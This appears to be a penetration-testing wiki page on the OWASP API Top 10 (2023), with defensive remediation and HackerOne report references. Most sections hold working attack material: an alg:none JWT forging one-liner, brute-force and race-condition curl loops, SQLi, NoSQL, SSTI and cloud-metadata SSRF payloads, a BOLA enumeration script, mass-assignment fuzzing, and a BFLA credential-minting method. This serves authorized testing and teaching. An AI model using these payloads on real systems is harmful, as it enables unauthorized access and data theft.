---
title: "API Security — OWASP API Top 10"
type: technique
tags: [api, authentication, exploitation, git-poc, h1, web]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-05-13
sources: [git-apistrike, h1-scraped-api-security, 0xdf-specialty-web]
---

## What it is

API-specific attack techniques targeting the OWASP API Security Top 10 (2023 edition). REST APIs expose authorization and injection flaws that differ from traditional web application vulnerabilities because they are object-centric, role-permutation-driven, and schema-defined. Many APIs are implicitly trusted by developers and receive far less access-control scrutiny than user-facing web pages.

See also: [[access-control]], [[authentication-attacks]], [[jwt-attacks]], [[ssrf]], [[sql-injection]]

---

## How it works

APIs accept structured requests (usually JSON over HTTP) against well-defined endpoints that map to data objects and actions. The attack surface is defined by the OpenAPI/Swagger spec: every endpoint, parameter, and HTTP method is a potential test case. Unlike web apps, APIs make authorization failures immediately and programmatically observable through structured error responses.

**Attack phases:** exploitation (authorization bypass), enumeration (parameter fuzzing), post-exploitation (mass data access via BOLA).

---

## Prerequisites

- API spec (OpenAPI/Swagger) — or enough crawling/fuzzing to reconstruct endpoint structure
- At least one valid low-privilege account and ideally a second account (victim) for BOLA/BFLA testing
- For BOLA: knowledge of at least one resource ID owned by each role (user_id, order_id, etc.)
- For injection: any account that can reach a parametric endpoint

---

## Methodology

### API1:2023 — BOLA (Broken Object Level Authorization)

BOLA is IDOR at the API layer, but made systematic: for every endpoint that takes an object ID in the path or query string, substitute IDs owned by a different role/user and observe whether the server enforces ownership.

**Mechanism:** The server looks up the object by ID without verifying that the authenticated principal owns it. Because IDs are often sequential or UUIDs exposed in earlier responses, an attacker can enumerate or predict them.

```
# Pattern: GET /api/v1/users/{user_id}/orders
# Attacker is user_A (user_id=101), victim is user_B (user_id=102)

GET /api/v1/users/102/orders HTTP/1.1
Authorization: Bearer <user_A_token>

# Vulnerable: returns user_B's orders
# Secure: 403 Forbidden or empty list
```

**Methodology:**
1. Collect all resource-owning endpoints from the spec or via crawling
2. Identify ID parameters: `user_id`, `account_id`, `order_id`, `document_id`, etc.
3. For each endpoint, swap in IDs owned by a different account at the same privilege level
4. Also test cross-privilege: lower-privilege role accessing admin-owned objects
5. Check all HTTP methods: a `GET` may be protected but `PUT`/`DELETE` may not be

**High-value BOLA targets:**
- Profile endpoints (`/users/{id}`, `/accounts/{id}`)
- Billing/payment records (`/invoices/{id}`, `/orders/{id}`)
- Private documents/files (`/documents/{id}`, `/uploads/{id}`)
- Admin-owned objects accessed from a user role (`/reports/{id}`)

---

### API2:2023 — Broken Authentication

API authentication failures distinct from web app auth:

**JWT algorithm confusion:** The server accepts `alg: none` or accepts RS256 tokens re-signed with HS256 using the public key as the secret. See [[jwt-attacks]] for the full attack methodology.

**Token manipulation without signature verification:**
```
# Decode JWT header: {"alg":"HS256","typ":"JWT"}
# Decode payload: {"user_id":101,"role":"user","exp":1700000000}
# Modify role to admin, re-sign with same secret or alg:none
echo '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_'
echo '{"user_id":101,"role":"admin","exp":9999999999}' | base64 | tr -d '=' | tr '+/' '-_'
# Append empty signature: header.payload.
```

**Expired token replay:** Some APIs validate the token structure but not the `exp` claim — try sending tokens with past expiration timestamps.

**No-token access:** Omit the Authorization header entirely on endpoints that should require it. Some APIs fail open when no token is present.

**API key in wrong location:** APIs sometimes check the key in headers but not in query strings, or vice versa. Try moving the credential.

---

### API3:2023 — Broken Object Property Level Authorization

Like BOLA but at the field level: an authenticated user can read or write object properties that should be restricted to higher privilege levels.

**Read variant (mass data exposure):**
```http
GET /api/v1/users/me HTTP/1.1
Authorization: Bearer <user_token>

# Vulnerable response exposes admin-only fields:
{"id":101,"email":"user@example.com","role":"user",
 "internal_score":89,"admin_notes":"flagged for fraud review",
 "ssn_last4":"6789"}
```

**Write variant — see mass assignment (API6)** below.

**Methodology:**
1. Fetch a resource as a low-privilege user
2. Compare response schema to what a higher-privilege user receives
3. In write requests (PATCH/PUT), include fields not in the normal request and check if they are accepted
4. Look for `is_admin`, `role`, `balance`, `credit`, `internal_*`, `_admin_*` fields

---

### API4:2023 — Unrestricted Resource Consumption (Rate Limits)

Sensitive endpoints without rate limiting enable:
- Account enumeration via email/username existence checks
- Credential stuffing against login endpoints
- OTP/2FA code brute-force against verification endpoints
- Bulk data harvest via ID enumeration

```bash
# Burst test: 100 simultaneous requests to a login endpoint
seq 100 | xargs -P100 -I{} curl -s -o /dev/null -w '%{http_code}\n' \
  -X POST https://api.example.com/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"user@example.com","password":"candidate{}"}'

# Race condition on a one-time-use token
for i in $(seq 1 10); do
  curl -s -X POST https://api.example.com/voucher/redeem \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"code":"GIFT100"}' &
done; wait
```

See [[race-conditions]] for full race condition methodology.

---

### API5:2023 — BFLA (Broken Function Level Authorization)

BFLA is vertical privilege escalation at the API function level: a lower-privilege role can call an endpoint that should be restricted to admin-only operations.

**Mechanism:** The API enforces object-level ownership but not the privilege level required to call certain operations. Admin functions often exist on the same base API path.

```
# Low-privilege user calls admin-only operations
GET  /api/v1/admin/users             # list all users (user role → should 403)
PUT  /api/v1/admin/users/102/ban     # ban another user (user role → should 403)
POST /api/v1/admin/refund/all        # mass refund (user role → should 403)
DELETE /api/v1/users/102             # delete another user (user role → should 403)
```

**Methodology:**
1. Enumerate admin-specific endpoints from the spec, JS source, or Swagger
2. Test each admin endpoint with a lower-privilege token
3. Test HTTP method escalation: `GET` may be allowed but `DELETE`/`PUT` may return 200 instead of 403
4. Look for version-based bypasses: `/v2/admin/users` may lack access control that `/v1/admin/users` enforces
5. Test unauthenticated access (no token at all) on every admin endpoint

---

### API6:2023 — Mass Assignment

The API automatically maps request body fields to object properties without a whitelist, allowing clients to set fields they should not control.

**Mechanism:** ORMs and frameworks (ActiveRecord, Mongoose, Sequelize, Django REST) auto-assign all request fields to the model object. If the allowlist (`permit` / `fields` / `read_only_fields`) is missing or incomplete, privileged properties are writable.

```http
# Normal user registration
POST /api/v1/users HTTP/1.1
{"email":"attacker@evil.com","password":"password123"}

# Mass assignment attempt: inject admin flag
POST /api/v1/users HTTP/1.1
{"email":"attacker@evil.com","password":"password123",
 "is_admin":true,"role":"admin","credit":99999,"verified":true}
```

**Where to look:**
- Registration and account-creation endpoints (`POST /users`, `POST /signup`)
- Profile update endpoints (`PUT /users/me`, `PATCH /profile`)
- Any endpoint accepting a JSON body — inject additional fields beyond the documented schema
- Try both request body injection and query parameter injection

**Common injectable fields:** `is_admin`, `role`, `admin`, `verified`, `email_verified`, `balance`, `credit`, `status`, `plan`, `permissions`, `group_id`

---

### API7:2023 — Security Misconfiguration

**CORS misconfiguration on APIs:** APIs that reflect arbitrary `Origin` headers or set `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` allow cross-origin data theft.

```bash
# Test for CORS reflection
curl -sk -I "https://api.example.com/user/profile" \
  -H "Origin: https://evil.com" \
  -H "Authorization: Bearer $TOKEN" | grep -i "access-control"
# Vulnerable: Access-Control-Allow-Origin: https://evil.com
#             Access-Control-Allow-Credentials: true
```

See [[cors-sop]] for full CORS attack methodology.

**Debug endpoints left active:**
- `/api/debug`, `/api/test`, `/api/internal`, `/__debug__`, `/actuator`
- `/api/v1/admin/swagger`, `/api/admin/phpinfo`
- `/graphql` with introspection enabled in production

**Overly verbose error messages:**
Stack traces in JSON error responses reveal framework versions, internal hostnames, file paths, and SQL query structure — all useful for targeted follow-on attacks.

**HTTP method permissiveness:**
```bash
# Test OPTIONS on every endpoint — some APIs allow DELETE/PUT on read-only endpoints
curl -X OPTIONS https://api.example.com/users/me -I
```

---

### API8:2023 — Injection at the API Layer

API endpoints inject user-supplied JSON/query/path values into backend systems in the same ways traditional web apps do, but the parameter format differs.

**JSON-embedded injection:**
```json
# SQLi in JSON body field
{"username": "admin' --", "password": "x"}

# NoSQL injection in JSON body (MongoDB)
{"email": {"$ne": null}, "password": {"$ne": null}}
{"email": "admin@example.com", "password": {"$gt": ""}}

# SSTI via JSON string
{"template": "{{7*7}}", "name": "test"}

# SSRF via callback URL field
{"webhook_url": "http://169.254.169.254/latest/meta-data/"}
```

**Path parameter injection:**
```
GET /api/v1/users/../admin/users          # path traversal
GET /api/v1/search?q=' OR '1'='1         # SQLi in query param
GET /api/v1/render?template={{7*7}}       # SSTI via path
```

**Header-based injection:**
```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: evil.com
X-Custom-IP-Authorization: 127.0.0.1
```

---

## Key Payloads / Examples

### BOLA Enumeration Script

```python
import requests

BASE = "https://api.example.com"
USER_TOKEN = "eyJ..."  # attacker's token
VICTIM_IDS = range(1, 1000)  # or collect from app

for obj_id in VICTIM_IDS:
    r = requests.get(
        f"{BASE}/api/v1/orders/{obj_id}",
        headers={"Authorization": f"Bearer {USER_TOKEN}"}
    )
    if r.status_code == 200:
        data = r.json()
        if data.get("user_id") != ATTACKER_ID:
            print(f"BOLA: {obj_id} → owner={data.get('user_id')}")
```

### Mass Assignment Fuzzing Fields

```bash
# Common privileged fields to inject
for field in is_admin role admin verified email_verified balance credit \
             status plan permissions group_id admin_level subscription_tier; do
  curl -s -X PATCH https://api.example.com/users/me \
    -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d "{\"$field\": true}" | jq .
done
```

### BFLA Discovery from Swagger/OpenAPI

```bash
# Extract all admin-prefixed paths from OpenAPI spec
jq -r '.paths | keys[] | select(contains("/admin") or contains("/internal") or contains("/management"))' \
  < swagger.json
```

---

## Bypasses and Variants

| Variant | Technique |
|---------|-----------|
| BOLA via indirect reference | Object referenced by slug/name rather than numeric ID — still substitutable |
| BOLA via HTTP method switch | `GET /orders/102` protected but `DELETE /orders/102` not checked |
| BFLA via API versioning | `/v2/admin/action` has no auth guard that `/v1/admin/action` enforces |
| Mass assignment via query param | `PUT /users/me?is_admin=true` — some frameworks bind query params to models |
| Broken property via nested objects | `{"profile": {"settings": {"admin_override": true}}}` |
| Auth bypass via content-type switch | `Authorization: Bearer` validated only for `application/json`; XML body skips auth |

---

## From the Wild — GraphQL-heavy kill chains (HTB, `0xdf-specialty-web`)

| Machine | API lesson |
|---------|-----------|
| **Overgraph** | Stack ships **Angular + GraphQL Playground/Voyager** on odd vhosts, **OTP flows**, **`localStorage` token robbery via XSS/CSTI/CSRF chain**, resolver-level **Mongo-style object injection**, and FFmpeg-backed SSR-style leaks. Treat every GraphQL field as injection surface regardless of REST parity. |
| **Cereal** | IIS/.NET SPA behind **JWT forgery**, then abuses **stored content plus unsafe deserialization** gated behind auth. Localhost **GraphQL** powers SSR-style coercion feeding Windows privesc primitives (example: GenericPotato class). Validates need to fuzz authenticated GraphQL when Swagger is absent. |

**Testing checklist distilled from notes:** crawl **GraphiQL/playground URIs**, export **JWT signing keys** embedded in repos, correlate **OTP reset endpoints**, and brute **Mongo-friendly filters** nested inside GraphQL variables.

---

## Detection and Defence

- **BOLA/BFLA:** Enforce ownership checks server-side for every object access; deny by default; use a middleware that validates the authenticated user owns or has permissions to the requested resource
- **Mass assignment:** Use allowlists (`permit` in Rails, `fields` in DRF, `@JsonIgnoreProperties` in Jackson) — never auto-bind all request fields to a model
- **API2 auth:** Validate all token fields server-side including `alg`, `exp`, `iss`; reject `alg:none`; use asymmetric keys for RS256
- **Rate limiting:** Apply per-account limits on all sensitive endpoints (auth, OTP, email verification, data export)
- **Inject:** Parameterize all database queries; validate all inputs against schema types

---

## Real-World Examples (HackerOne — paid reports)

| Program   | Title                                                                           | Severity | Bounty  | Report                                            |
| --------- | ------------------------------------------------------------------------------- | -------- | ------- | ------------------------------------------------- |
| HackerOne | Disclosing PolicyPageAssetGroup in Private Programs via /graphql `gid://...`    | Critical | $25,000 | [#1618347](https://hackerone.com/reports/1618347) |
| HackerOne | DOS via Mutation Aliasing in GraphQL Account Recovery Phone Number Verification | Unknown  | $12,500 | [#3287208](https://hackerone.com/reports/3287208) |
| Shopify   | Undocumented `fileCopy` GraphQL API                                             | Medium   | $2,000  | [#981472](https://hackerone.com/reports/981472)   |
| GitLab    | A deactivated user can access data through GraphQL                              | Medium   | $1,370  | [#1192460](https://hackerone.com/reports/1192460) |
| Reddit    | Image queue default key of 'None' and GraphQL unhandled type exception          | Medium   | $500    | [#996041](https://hackerone.com/reports/996041)   |
| HackerOne | Revoking user session does not revoke the GraphQL query session                 | Low      | $500    | [#417382](https://hackerone.com/reports/417382)   |
| Shopify   | STAFF member with NO Explicit permissions can view ActivityFeed via GraphQL     | Low      | $500    | [#528940](https://hackerone.com/reports/528940)   |
| HackerOne | Team object in GraphQL disclosed private programs via industry field            | Low      | $500    | [#707406](https://hackerone.com/reports/707406)   |

**Patterns:** GraphQL is heavily represented — BOLA/IDOR via predictable GID-style IDs ($25K), mutation aliasing for DoS ($12.5K), undocumented mutations, and access control on field-level resolvers. HackerOne and Shopify both run GraphQL APIs and have paid repeatedly for authorization bypasses at the field/object level.

## Sources

- `git-apistrike` — OWASP API Top 10 implementation analysis from RevoltSecurities/apistrike README + DAST engine source
- `h1-scraped-api-security` — 8 paid HackerOne reports (top: $25,000 critical GraphQL BOLA, $12,500 GraphQL DoS)
- `0xdf-specialty-web` — Overgraph, Cereal (GraphQL-heavy chains)

---

## Mass Assignment (API6)
A mass assignment attack is a security vulnerability that occurs when a web application automatically assigns user-supplied input values to properties or variables of a program object. This can become an issue if a user is able to modify attributes they should not have access to, like a user's permissions or an admin flag.

**Vulnerable Frameworks:**
Frameworks that use Object-Relational Mapping (ORM) techniques are often susceptible if models aren't properly configured (e.g. Ruby on Rails, Django, Laravel, Spring Boot).

**Payload Injection:**
If an attacker intercepts a request creating or updating an object (like a user profile), they can inject extra parameters that aren't exposed in the UI.
```json
{
    "username": "attacker",
    "email": "attacker@email.com",
    "password": "unsafe_password",
    "isAdmin": true
}
```
If the backend does not implement strict filtering (e.g., strong parameters in Rails), the `isAdmin` flag will be written directly to the database.

## Wired sub-techniques

<!-- auto-wired: context-reachable sub-technique pages -->
- [[cors]]
- [[scim-attacks]]

### BFLA on credential-issuing endpoints (API-key / token minting)

The highest-impact BFLA target is any endpoint that ISSUES a credential: create API key/keyset,
personal-access-token, service-account, or webhook secret. If the create route lacks a server-side
function-level authorization pre-handler, a low-privilege role can mint a credential and escalate
from the management plane to whatever data plane that credential unlocks. This routinely outranks
data-object BFLA because one minted key often reads the entire tenant.

**Test:**
1. Enumerate credential-issuing create routes (e.g. `POST .../api-keysets`, `.../tokens`, `.../service-accounts`).
2. Replay the create request as a role that LACKS the managing permission.
3. **The tell:** a `400` (body-validation error) instead of `403` means the authorization
   pre-handler is missing - the request reached the handler and was only stopped by schema
   validation. Confirm the authz layer exists elsewhere by hitting a sibling write route that DOES
   return `403` to the same role. A `201` with a usable credential is the confirmation.
4. **Prove impact, do not stop at 2xx:** use the minted credential against the data API. A real
   record (versus a `401` when you swap in a wrong secret) proves it is a working credential, not
   just a permissive status code.

**Recovering a blocked create-body from the SPA bundle.** When every guessed body shape is rejected
with a custom `'<field>' is empty/invalid` error AND that field name does not appear anywhere in the
frontend JS, the SPA is sending a DIFFERENT field that the BFF/upstream maps into the one the
validator names. Recover the real body from the app bundle instead of brute-guessing (fewer created
artifacts, no WAF noise):
```
# 1. get the build id, pull _buildManifest + the framework chunks
# 2. walk the embedded chunk graph to download ALL chunks:
grep -rhoE "static/chunks/[^\"']+\.js" <chunks_dir> | sort -u   # then fetch each
# 3. find the create FORM chunk and its mutation:
#    post(apiUrl("<ROUTE_CONST>"), formValues)   where formValues = {name, <bool env flags>, ...}
```
The form-value object IS the request body; friendly booleans (e.g. `sandbox`/`live`) map server-side
to the strict field the validator complained about.

**Environment / tenant-scope at creation.** Separately test whether credential creation enforces
environment scope: a sandbox-only tenant that can mint a `production`-scoped credential (accepted at
the API auth layer, distinguishable from a bad secret by `403` vs `401`, even if data is gated
downstream) is a broken environment-isolation finding on its own.

**Remediation.** Add an authorization pre-handler (running BEFORE body validation) on every
credential-issuing route, keyed on the managing permission; enforce environment gating at creation;
do not return full secrets outside the single create response; audit/alert on mint events.

<!-- promoted-slug: bfla-credential-minting -->
